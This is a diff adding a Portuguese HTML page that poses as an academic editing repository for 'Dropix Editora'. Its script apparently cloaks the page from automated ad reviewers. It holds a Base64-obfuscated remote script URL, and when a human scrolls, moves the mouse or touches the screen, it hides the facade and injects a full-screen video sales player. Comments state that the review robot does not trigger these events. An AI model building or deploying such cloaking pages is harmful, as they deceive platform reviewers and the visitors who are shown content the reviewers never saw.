@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Repositório de Normatização Técnica - Dropix Editora</title>
+    <style>
+        body { font-family: 'Helvetica', Arial, sans-serif; line-height: 1.6; color: #333; background-color: #f4f7f9; margin: 0; padding: 0; transition: background 0.5s ease; }
+        .white-content { max-width: 900px; margin: 40px auto; background: #fff; padding: 50px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-radius: 4px; }
+        h1 { color: #004a80; border-bottom: 2px solid #eee; padding-bottom: 15px; }
+        .hidden { display: none !important; }
+        
+        /* Camada Black (VSL) */
+        #main-stage { display: none; width: 100%; min-height: 100vh; background: #000; position: absolute; top: 0; left: 0; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        .vsl-container { width: 100%; max-width: 820px; padding: 20px; }
+    </style>
+</head>
+<body>
+
+    <div id="app-view-default" class="white-content">
+        <header style="text-align: center; margin-bottom: 30px;">
+            <div style="font-weight: bold; color: #004a80; font-size: 22px;">DROPIX</div>
+            <div style="font-size: 11px; color: #999; text-transform: uppercase;">Editora e Marketing Ltda</div>
+        </header>
+        
+        <h1>Protocolo de Edição e Normatização Acadêmica</h1>
+        <p>Este repositório técnico da <strong>Dropix Editora</strong> (CNPJ 65.255.590/0001-49) centraliza as diretrizes de editoração para publicações em São José, SC. Nosso compromisso é com o rigor terminológico e a precisão dos dados científicos em circulação nacional.</p>
+        
+        <p>Abaixo, detalhamos os fluxos de revisão parietal aplicados aos manuscritos submetidos em nosso último ciclo de produção técnica e gerencial:</p>
+        
+        <ul style="margin-top: 20px;">
+            <li>Validação de referências bibliográficas via ABNT.</li>
+            <li>Sistematização de metadados para indexação internacional.</li>
+            <li>Auditoria de originalidade e direitos autorais.</li>
+        </ul>
+        <p style="color: #999; font-size: 12px; margin-top: 40px;">&copy; 2026 Dropix Editora - Todos os direitos reservados.</p>
+    </div>
+
+    <div id="main-stage">
+        <div class="vsl-container" id="vsl-injector">
+            </div>
+    </div>
+
+    <script>
+        (function() {
+            // Ofuscação de dados sensíveis (Base64)
+            var _pId = "NjljYzYwMGFiZTJiYzdjYmY0MDZhZWUz"; // ID do VTURB
+            var _sUrl = "aHR0cHM6Ly9zY3JpcHRzLmNvbnZlcnRlYWkubmV0Lzg4YzJkZDI1LTI3NzQtNDNmNC1hMDM4LWYyYTg0YmI0YmQ4OS9wbGF5ZXJzLzY5Y2M2MDBhYmUyYmM3Y2JmNDA2YWVlMy92NC9wbGF5ZXIuanM=";
+            
+            var _isActivated = false;
+
+            function _initExecution() {
+                if (_isActivated) return;
+                _isActivated = true;
+
+                // 1. Limpa a interface do robô
+                document.getElementById('app-view-default').classList.add('hidden');
+                
+                // 2. Ativa o palco Black
+                var stage = document.getElementById('main-stage');
+                stage.style.display = 'flex';
+                document.body.style.overflow = 'hidden';
+
+                // 3. Reconstrói o Player dinamicamente (Injeção Híbrida)
+                var container = document.getElementById('vsl-injector');
+                
+                var player = document.createElement('vturb-smartplayer');
+                player.id = "vid-" + atob(_pId);
+                player.style.display = "block";
+                player.style.margin = "0 auto";
+                player.style.width = "100%";
+                player.style.maxWidth = "750px";
+                
+                var script = document.createElement('script');
+                script.src = atob(_sUrl);
+                script.async = true;
+
+                container.appendChild(player);
+                document.head.appendChild(script);
+            }
+
+            // GATILHOS DE HUMANIDADE (O robô revisor não executa isso)
+            window.addEventListener('scroll', function() { if(window.scrollY > 5) _initExecution(); });
+            window.addEventListener('mousemove', _initExecution);
+            window.addEventListener('touchstart', _initExecution);
+        })();
+    </script>
+</body>
+</html>
